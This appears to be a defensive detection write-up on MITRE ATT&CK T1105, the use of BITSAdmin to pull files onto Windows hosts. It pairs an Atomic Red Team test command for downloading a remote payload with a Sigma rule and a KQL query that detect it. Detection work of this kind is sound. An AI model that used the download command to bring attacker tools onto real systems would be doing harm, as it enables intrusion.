# T1105 – Ingress Tool Transfer

## Technique Description

**MITRE ATT&CK ID:** T1105
**Tactic:** Command and Control 
**Platform:** Windows

Ingress Tool Transfer is a technique used by adversaries to transfer additional tools, payloads, or files from an external system into a compromised environment. These tools are often required for persistence, credential access, lateral movement, or further command execution.

On Windows systems, attackers frequently abuse BITSAdmin, a legitimate Windows utility designed to transfer files asynchronously using the Background Intelligent Transfer Service (BITS). Because BITS is commonly used for updates and administrative tasks, malicious downloads can blend into normal system activity and bypass network-based security controls.

**Real-World Usage:**  
Threat actors such as **APT28** and **APT33** have abused BITS-based transfers to download payloads while evading traditional detection mechanisms.

---

## Atomic Red Team Test

**Test Number:** Test #9
**Supported Platforms:** Windows

### Test Command
```
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
```

**Parameters:**
- `/transfer` - Creates and starts a BITS transfer job to download a file from a remote location to the local system

- `#{bits_job_name}` - Arbitrary identifier for the BITS job, used to manage or reference the transfer

- `/Priority HIGH` - Sets the BITS job priority to HIGH, allowing faster data transfer and reduced throttling

- `#{remote_file}` - Remote URL hosting the payload to be downloaded

- `#{local_path}` - Destination path on the victim system where the downloaded file is written (often a temporary or user-writable directory)

### Expected Behavior
When executed, BITSAdmin downloads a remote file from an external server and saves it locally to the temporary directory. This simulates the transfer of attacker tooling or payloads into the compromised host without triggering traditional download utilities.

---

## Sigma Rule

```yaml
title: Ingress Tool Transfer via BITSAdmin
id: a1921cd3-t1105-bitsadmin-download
status: experimental
description: Detects file download activity using bitsadmin.exe, commonly abused by attackers to transfer tools or payloads from remote servers
references:
    - https://attack.mitre.org/techniques/T1105
    - https://github.com/redcanaryco/atomic-red-team
author: Ghofrane Amemi
date: 2026-02-01
tags:
  - attack.command_and_control
  - attack.t1105
  - atomic_red_team

logsource:
  product: windows
  category: process_creation
  service: sysmon

detection:
  selection_bitsadmin:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains:
      - '/transfer'
      - 'https'

  condition: selection_bitsadmin

falsepositives:
  - Legitimate IT scripts using BITS for downloads
  - Software update mechanisms
  - Internal IT automation using BITS

level: high
```
---

## Kibana Detection Query

**Rule Name:** T1105 – Ingress Tool Transfer via BITS
**Severity:** High

### KQL Query
```kql
winlog.channel: "Microsoft-Windows-Sysmon/Operational"
AND event.code: "1"
AND process.name: "bitsadmin.exe"
AND process.command_line.text: "*\/transfer*"
AND process.command_line.text: "*https*"
```

### Required Data Sources
- **Log Source:** Sysmon
- **Event ID:** 1 (Process Creation)
- **Channel:** Microsoft-Windows-Sysmon/Operational

---

## Limitations

This detection does not cover:
- File transfers performed via PowerShell (Invoke-WebRequest, Start-BitsTransfer)
- Payloads delivered via browser-based downloads
- Encrypted or API-based transfer mechanisms without visible command-line artifacts